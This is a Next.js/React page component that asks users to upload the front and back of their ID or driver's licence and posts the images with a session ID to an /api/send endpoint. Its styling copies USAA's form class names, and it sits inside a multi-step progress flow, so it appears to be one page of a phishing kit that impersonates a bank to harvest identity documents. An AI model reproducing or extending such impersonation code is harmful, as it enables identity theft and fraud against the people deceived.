import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import { FileInput } from "../components/FileInput";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface DocumentProps { }

const FILE_SIZE = 96000 * 1024;
const SUPPORTED_FORMATS = [`image/jpg`, `image/jpeg`, `image/gif`, `image/png`];

const schema = yup.object().shape({
  front: yup
    .mixed()
    .required(
      `This field is required, please upload the front image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value: any) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value: any) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value: any) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
  back: yup
    .mixed()
    .required(
      `This field is required, please upload the back image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value: any) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value: any) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value: any) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
});

export const Document: React.FC<DocumentProps> = ({ }) => {
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch
  } = useForm({
    resolver: yupResolver(schema),
    mode: `all`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, (data.front as any)[0]);
    formData.append(`back`, (data.back as any)[0]);
    formData.append(`form`, `DOCUMENTS`);
    formData.append(`sessionId`, datas.sessionId);

    await axios.post(`/api/send`, formData);
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: (data.front as any)[0],
        back: (data.back as any)[0],
      },
    });

    const url = getProgress()[getProgress().indexOf(`DOCUMENT`) + 1];

    push(getNextUrl(url));
  });

  return (
    <Wrapper
      title="Take Picture of Your ID/Driver's License"
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      errors={errors}
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <FileInput
            name={`front`}
            label="Front of ID"
            register={register}
            watch={watch}
            error={errors.front && (errors.front.message as unknown as string)}
          />
        </div>
      </div>
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <FileInput
            name={`back`}
            label="Back of ID"
            register={register}
            watch={watch}
            error={errors.back && (errors.back.message as unknown as string)}
          />
        </div>
      </div>
    </Wrapper>
  );
};

export default Document;
